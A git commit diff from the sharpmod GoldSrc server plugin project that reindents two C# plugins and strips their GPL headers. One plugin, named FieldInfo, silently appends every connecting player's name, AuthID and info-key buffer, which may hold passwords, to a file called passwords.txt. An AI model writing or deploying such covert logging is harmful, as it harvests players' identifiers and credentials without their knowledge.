c2bb06d4eda6287a96cb98b258fa1665a9508a43
Andrius Bentkus <andrius.bentkus@gmail.com>
2012-06-20 07:15:44 +0200

    Codestyle.

--- src/Plugins/SharpMod.FieldInfo/FieldInfo.cs
+++ src/Plugins/SharpMod.FieldInfo/FieldInfo.cs
@@ -1,24 +1,3 @@
-//
-//     This file is part of sharpmod.
-//     sharpmod is a metamod plugin which enables you to write plugins
-//     for Valve GoldSrc using .NET programms.
-// 
-//     Copyright (C) 2010  Andrius Bentkus
-// 
-//     csharpmod is free software: you can redistribute it and/or modify
-//     it under the terms of the GNU General Public License as published by
-//     the Free Software Foundation, either version 3 of the License, or
-//     (at your option) any later version.
-// 
-//     csharpmod is distributed in the hope that it will be useful,
-//     but WITHOUT ANY WARRANTY; without even the implied warranty of
-//     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-//     GNU General Public License for more details.
-// 
-//     You should have received a copy of the GNU General Public License
-//     along with csharpmod.  If not, see <http://www.gnu.org/licenses/>.
-//
-
 using System;
 using System.IO;
 using System.Runtime.InteropServices;
@@ -26,16 +5,15 @@ using SharpMod;
 
 namespace SharpMod.FieldInfo
 {
-  public class Plugin : BasicPlugin
-  {
-    public override void Load()
-    {
-      Player.Connect += delegate(Player.ConnectEventArgs args) {
-        StreamWriter sw = new StreamWriter(File.Open("passwords.txt", FileMode.Append));
-        sw.WriteLine("{0} {1} {2} {3}", DateTime.Now, args.Player.Name, args.Player.AuthID, args.Player.InfoKeyBuffer);
-        sw.Close();
-      };
-    }
-
-  }
+	public class Plugin : BasicPlugin
+	{
+		public override void Load()
+		{
+			Player.Connect += (Player.ConnectEventArgs args) => {
+				StreamWriter sw = new StreamWriter(File.Open("passwords.txt", FileMode.Append));
+				sw.WriteLine("{0} {1} {2} {3}", DateTime.Now, args.Player.Name, args.Player.AuthID, args.Player.InfoKeyBuffer);
+				sw.Close();
+			};
+		}
+	}
 }
--- src/Plugins/SharpMod.Nextmap/Nextmap.cs
+++ src/Plugins/SharpMod.Nextmap/Nextmap.cs
@@ -1,24 +1,3 @@
-// 
-//     This file is part of sharpmod.
-//     sharpmod is a metamod plugin which enables you to write plugins
-//     for Valve GoldSrc using .NET programms.
-// 
-//     Copyright (C) 2010  Andrius Bentkus
-// 
-//     csharpmod is free software: you can redistribute it and/or modify
-//     it under the terms of the GNU General Public License as published by
-//     the Free Software Foundation, either version 3 of the License, or
-//     (at your option) any later version.
-// 
-//     csharpmod is distributed in the hope that it will be useful,
-//     but WITHOUT ANY WARRANTY; without even the implied warranty of
-//     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-//     GNU General Public License for more details.
-// 
-//     You should have received a copy of the GNU General Public License
-//     along with csharpmod.  If not, see <http://www.gnu.org/licenses/>.
-// 
-
 using System;
 using System.IO;
 using System.Collections;
@@ -27,11 +6,10 @@ using SharpMod;
 
 namespace SharpMod.Nextmap
 {
-  public class MainClass : BasicPlugin
-  {
-    public override void Load()
-    {
-    }
-
-  }
+	public class MainClass : BasicPlugin
+	{
+		public override void Load()
+		{
+		}
+	}
 }
